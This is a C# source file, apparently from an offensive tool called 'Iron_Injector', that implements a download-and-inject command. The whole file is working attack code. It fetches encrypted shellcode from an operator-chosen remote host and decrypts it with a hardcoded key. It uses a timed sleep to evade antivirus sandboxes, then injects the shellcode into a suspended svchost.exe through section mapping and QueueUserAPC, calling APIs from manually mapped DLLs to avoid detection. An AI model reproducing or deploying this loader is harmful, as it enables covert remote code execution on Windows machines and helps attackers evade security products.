using Iron_Injector.Models.Abstracts;
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Iron_Injector.API;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Pastel;
using System.Drawing;

namespace Iron_Injector.Commands.Shell_Commands
{
    public class Download_Inject
    {
        public static string Url { get; set; }
        public static string Filename { get; set; }
        public static string LoaderType { get; set; }
        private static h_reprobate.PE.PE_MANUAL_MAP ker32 = reprobate.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");

        public static void ExecuteShellcode()
        {


            //get some variuables ready for spawning process
            var si = new WinAPIs.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            var pi = new WinAPIs.PROCESS_INFORMATION();
            var pa = new WinAPIs.SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);
            var ta = new WinAPIs.SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            Url = (ModuleBase.ModuleOptions.FirstOrDefault(u => u.Name.Equals("url", StringComparison.OrdinalIgnoreCase))).CurrentValue;
            Filename = (ModuleBase.ModuleOptions.FirstOrDefault(f => f.Name.Equals("filename", StringComparison.OrdinalIgnoreCase))).CurrentValue;
            LoaderType = (ModuleBase.ModuleOptions.FirstOrDefault(l => l.Name.Equals("loadertype", StringComparison.OrdinalIgnoreCase))).CurrentValue;

            //download
            byte[] downloadedEncShellcode = downloadShellcode(Url, Filename);
            if (downloadedEncShellcode == null)
            {
                return;
            }

            //sleep
            Console.WriteLine("[+] Sleeping to avoid AV");
            DateTime t1 = DateTime.Now;
            WinAPIs.Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                Console.WriteLine("[-]Failed sleep check bailing.");
                return;
            }
            // spawn new process 
            Console.WriteLine($"{"[*]".Pastel(Color.DeepSkyBlue)} attempting to create new process");
            var createProcessParameters = new object[] { "C:\\Windows\\System32\\svchost.exe", null, ta, pa, false, (uint)0x4, IntPtr.Zero, "C:\\Windows\\System32", si, pi };
            object successCreateProcess = reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "CreateProcessW", typeof(WinApiDynamicDelegate.CreateProcessW), createProcessParameters);
            // makes sure we have access to the correct (out) pi values from the API invoke
            pi = (WinAPIs.PROCESS_INFORMATION)createProcessParameters[9];

            // if it spawns new process keep going if not gtfo
            if (!(bool)successCreateProcess)
            {
                Console.WriteLine($"{"[-]".Pastel(Color.Red)} Process creation failed");
                return;
            }
            Console.WriteLine($"{"[+]".Pastel(Color.Green)} Created new process at PID {pi.dwProcessId}");


            byte[] password = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("!r0nInj3ct0r123!"));


            //decrypt so can load
            byte[] shellcode = DeEncryptShellcode(downloadedEncShellcode, password);

            // if LoaderType equals MapView use the MapViewLoadShellcode method to run the shellcode with the correct parameters from the pi values
            bool success = false;
            if (LoaderType.Equals("MapView", StringComparison.OrdinalIgnoreCase))
            {
                if (MapViewLoadShellcode(shellcode, pi.hProcess, pi.hThread))
                {
                    success = true;
                }
            }
            // going to add more injection techniques in future updates. 
            else
            {
                Console.WriteLine($"{"[-]".Pastel(Color.Red)} LoaderType {LoaderType} not supported");
                return;
            }

            if (success)
            {
                Console.WriteLine($"{"[+]".Pastel(Color.Green)} Shellcode activated enjoy dynamically invoked shell :)");
            }
            else
                Console.WriteLine($"{"[-]".Pastel(Color.Red)} :( Fialed to Execte shellcode in remote process.");
        }

        public static byte[] downloadShellcode(string url, string filename)
        {
            byte[] encShellcode;
            try
            {
                WebClient wc = new WebClient();
                encShellcode = wc.DownloadData("http://" + url + "/" + filename);
                Console.WriteLine($"{"[+]".Pastel(Color.Green)}Downloaded shellcode, size: {encShellcode.Length}");
                return encShellcode;
            }
            catch (Exception)
            {
                Console.WriteLine($"{"[-]".Pastel(Color.Red)} Download failed");
                return null;
            }

        }

        public static byte[] DeEncryptShellcode(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    Console.WriteLine($"{"[+]".Pastel(Color.Green)}setting AES options");
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    Console.WriteLine($"{"[+]".Pastel(Color.Green)}setting AES key");
                    AES.Mode = CipherMode.CBC;
                    Console.WriteLine($"{"[+]".Pastel(Color.Green)}decrypting bytes");
                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                        Console.WriteLine($"{"[+]".Pastel(Color.Green)}decrypted bytes");
                    }
                    decryptedBytes = ms.ToArray();
                }
            }
            Console.WriteLine($"{"[+]".Pastel(Color.Green)}Returning decrypted bytes");
            return decryptedBytes;
        }

        public static bool MapViewLoadShellcode(byte[] shellcode, IntPtr hProcess, IntPtr hThread)
        {
            var ntdll = reprobate.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");
            //var ker32 = reprobate.MapModuleToMemory(@"C:\Windows\System32\kernel32.dll");

            var hSection = IntPtr.Zero;
            var maxSize = (ulong)shellcode.Length;

            // dinvoke nt create section
            // make object that holds the input parameters for the api
            var createSectionParameters = new object[] { hSection, (uint)0x10000000, IntPtr.Zero, maxSize, (uint)0x40, (uint)0x08000000, IntPtr.Zero };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtCreateSection", typeof(WinApiDynamicDelegate.NtCreateSection), createSectionParameters, false);
            hSection = (IntPtr)createSectionParameters[0];

            // dinvoke map view of section local
            IntPtr localBaseAddress = new IntPtr();
            ulong viewSize = new ulong();
            var mapViewParameters = new object[] { hSection, Process.GetCurrentProcess().Handle, localBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, viewSize, (uint)2, (uint)0, (uint)0x04 };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
            localBaseAddress = (IntPtr)mapViewParameters[2];

            // writeProcessMemory locally so we can map it to target after
            var numberOfBytes = new IntPtr();
            var writeProcessParameters = new object[] { Process.GetCurrentProcess().Handle, localBaseAddress, shellcode, (uint)shellcode.Length, numberOfBytes };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "WriteProcessMemory", typeof(WinApiDynamicDelegate.WriteProcessMemory), writeProcessParameters, false);
            numberOfBytes = (IntPtr)writeProcessParameters[4];
            Console.WriteLine($"{"[+]".Pastel(Color.Green)} Number of bytes written is :{(uint)numberOfBytes}");

            // dinvoke map view of section remote which basically copies shellcode
            IntPtr remoteBaseAddress = new IntPtr();
            mapViewParameters = new object[] { hSection, hProcess, remoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, viewSize, (uint)2, (uint)0, (uint)0x20 };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ntdll.PEINFO, ntdll.ModuleBase, "NtMapViewOfSection", typeof(WinApiDynamicDelegate.NtMapViewOfSection), mapViewParameters, false);
            remoteBaseAddress = (IntPtr)mapViewParameters[2];
            Console.WriteLine($"{"[+]".Pastel(Color.Green)}Mapped view to target");

            // Queue user APC
            var queueUserParameters = new object[] { remoteBaseAddress, hThread, (uint)0 };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "QueueUserAPC", typeof(WinApiDynamicDelegate.QueueUserAPC), queueUserParameters, false);

            // resume thread to activate 
            var resumeThreadnParameters = new object[] { hThread };
            // invoke the api call, pass the dll, function name, delegate type, parameters        
            object createThreadResult = reprobate.CallMappedDLLModuleExport(ker32.PEINFO, ker32.ModuleBase, "ResumeThread", typeof(WinApiDynamicDelegate.ResumeThread), resumeThreadnParameters, false);

            //reprobate.FreeModule(ntdll);
            //reprobate.FreeModule(ker32);

            if ((uint)createThreadResult == 1)
                return true;
            else
                return false;
        }

    }
}
